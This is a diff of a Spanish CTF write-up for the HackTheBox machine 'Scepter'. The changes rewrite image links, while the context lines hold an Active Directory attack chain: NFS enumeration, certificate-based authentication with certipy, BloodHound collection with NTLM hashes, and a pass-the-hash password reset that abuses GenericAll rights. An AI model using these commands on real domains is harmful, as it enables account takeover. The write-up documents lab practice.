@@ -1,7 +1,7 @@
 
 ---
 
-![[Pasted image 20250530113027.png]]
+![image](../../../../Imágenes/20250530113027.png)
 
 
 ---
@@ -42,13 +42,13 @@ El puerto **2049/tcp** (NFS) me llamó la atención. Revisé los `mount` disponi
 ```bash
 showmount -e scepter.htb
 ```
-![[Pasted image 20250530114411.png]]
+![image](../../../../Imágenes/20250530114411.png)
 
 ## NFS Mount & File Discovery
 
 Montamos y revisamos el NFS `/helpdesk` encontrado:
 
-![[Pasted image 20250530114728.png]]
+![image](../../../../Imágenes/20250530114728.png)
 
 Podemos ver algunos archivos de certificados, y algunos `.pfx` que intentamos crackear:
 
@@ -64,13 +64,13 @@ Pero viendo que no lo conseguimos, creamos un `pfx` utilizando los `.key` y `.cr
 sudo openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt -passout pass:newpassword
 ```
 
-![[Pasted image 20250530125532.png]]
+![image](../../../../Imágenes/20250530125532.png)
 
 ```bash
 certipy auth -pfx baker.pfx -dc-ip 10.10.11.65
 ```
 
-![[Pasted image 20250530210847.png]]
+![image](../../../../Imágenes/20250530210847.png)
 
 Ahora que tenemos acceso, ejecutamos `bloodhound`:
 
@@ -78,12 +78,12 @@ Ahora que tenemos acceso, ejecutamos `bloodhound`:
 bloodhound-python -u 'd.baker' --hashes <NTLM hashes> -d scepter.htb -ns 10.10.11.65 --auth-method ntlm -c All --zip --disable-autogc
 ```
 
-![[Pasted image 20250530211202.png]]
+![image](../../../../Imágenes/20250530211202.png)
 # Acceso
 
 Como podemos observar en la siguiente imagen, identificamos privilegios **OutboundControl** en el usuario `a.carter`.
 
-![[Pasted image 20250530211937.png]]
+![image](../../../../Imágenes/20250530211937.png)
 
 Cambiamos la contraseña se `a.carter` usando `changepasswd.py`:
 
@@ -91,11 +91,11 @@ Cambiamos la contraseña se `a.carter` usando `changepasswd.py`:
 changepasswd.py 'scepter.htb'/'a.carter'@10.129.10.255 -reset -altuser 'd.baker' -althash : <NT hash>
 ```
 
-![[Pasted image 20250530212825.png]]
+![image](../../../../Imágenes/20250530212825.png)
 
 Y una vez capaces de utilizar a `a.carter`, aprovechamos los permisos `GenericAll` que tiene sobre el grupo `STAFF ACCESS CERTIFICATE`.
 
-![[Pasted image 20250530214248.png]]
+![image](../../../../Imágenes/20250530214248.png)
 
 Paso 1: Confirmar `GenericAll`:
 
